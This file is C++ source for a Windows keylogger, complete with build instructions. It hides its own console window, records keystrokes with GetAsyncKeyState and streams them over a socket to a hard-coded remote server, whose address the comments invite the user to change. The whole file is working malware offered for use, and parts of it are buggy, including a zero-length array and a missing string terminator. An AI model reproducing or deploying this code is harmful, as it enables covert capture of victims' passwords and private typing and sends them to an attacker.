// Keylogger script (WINDOWS SPECIFIC)
// Compile with --> g++ logger.cpp -lws2_32 -o l.exe
#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <conio.h>

#pragma comment(lib,"ws2_32.lib")

using namespace std;

// Server details
const char *master = "192.168.220.158"; // Change this
int port = 80;                          // Change this

// Windows wouldn't show
void stealth_mode(){
  HWND stealth;
  AllocConsole();
  stealth=FindWindowA("ConsoleWindowClass",NULL);
  ShowWindow(stealth,0); 
}

// Socket operations
class socket_ops{
  public:
    SOCKET s;
    WSADATA wsa;
    // Create socket and connect to server
    int socket_create(){
      struct sockaddr_in server;
      WSAStartup(MAKEWORD(2,2),&wsa);
      s = socket(AF_INET , SOCK_STREAM , 0 );
      // Connect
      server.sin_addr.s_addr = inet_addr(master);
      server.sin_family = AF_INET;
      server.sin_port = htons( port );
      connect(s , (struct sockaddr *)&server , sizeof(server));
      return s;
    };
    
    // Send data
    void socket_send(const char *msg){
      send(this->s ,msg,strlen(msg),0);
    }
};

// Get keys
char i;
char k[0];
const char * get_keys(){
  for(i = 0; i <= 500; i++){      
    if (GetAsyncKeyState(i) & 0x0001){   
      k[0] = (char) i;
      // Monitor for special chars
      switch(k[0]){
        case VK_SHIFT:
          return " [SHIFT] ";

        case VK_ESCAPE:
          return " [ESC] ";

        case VK_CONTROL:
          return " [CTRL] ";

        case VK_TAB:
          return " [TAB] ";

        case VK_DELETE:
          return " [DEL] ";

        case VK_RETURN:
          return " [ENTER] ";
          
        default:
          return (const char *) k;
      } 
    };
  };
};

// Main
int main(){
  stealth_mode();
  socket_ops Socks;
  Socks.socket_create();
  while (true){
    Socks.socket_send(get_keys());
  }
}